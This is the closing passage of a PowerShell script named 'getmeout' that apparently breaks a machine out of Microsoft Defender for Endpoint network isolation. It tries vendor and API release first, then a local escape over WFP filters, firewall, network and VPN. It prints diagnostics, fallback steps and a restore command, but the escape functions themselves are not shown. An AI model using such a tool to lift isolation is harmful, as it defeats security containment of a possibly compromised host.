    Write-Host "------------ getmeout : MDE escape ------------" -ForegroundColor White

    Invoke-PortalRelease       # vendor-supported release, if script provided
    Invoke-ApiRelease          # official release, if credentials were given
    $null = Invoke-EscapeOnce  # local escape: WFP + firewall + network + VPN

    Write-Step 'Verification'
    if (Test-Escape) {
        Write-Ok 'Connectivity restored.'
    }
    else {
        Write-Warn 'Still no connectivity - a block layer survived. Diagnosing:'
        Invoke-Resilient 'WFP diagnostics' {
            Invoke-DumpWfpDiagnostics -WfpXml (Get-WfpStateXml)
        }
        Write-Host ''
        Write-Info 'Fixes to try, in order:'
        Write-Info ' 1. Reboot - clears half-applied adapter/service state, then rerun.'
        Write-Info ' 2. .\getmeout.ps1 -Status  and check the BLOCK filter names / SENSE events.'
        Write-Info ' 3. Portal "force release" script via -ForceReleaseScript <path>, or -Api* release.'
        Write-Info ' 4. .\getmeout.ps1 -FullReset, then reboot (Winsock/TCP stack reset).'
    }

    Write-Host ''
    Write-Host '------------------------------------------' -ForegroundColor DarkGray
    Write-Host '  Escape attempt finished.' -ForegroundColor White
    Write-Host "  WFP backup : $BackupPath" -ForegroundColor Cyan
    Write-Host '------------------------------------------' -ForegroundColor DarkGray
    Write-Host ''
    Write-Host '  To restore isolation:' -ForegroundColor White
    Write-Host "  .\$scriptName -Restore -BackupFile '$BackupPath'" -ForegroundColor Yellow
    Write-Host ''
}

try { Stop-Transcript | Out-Null } catch { }
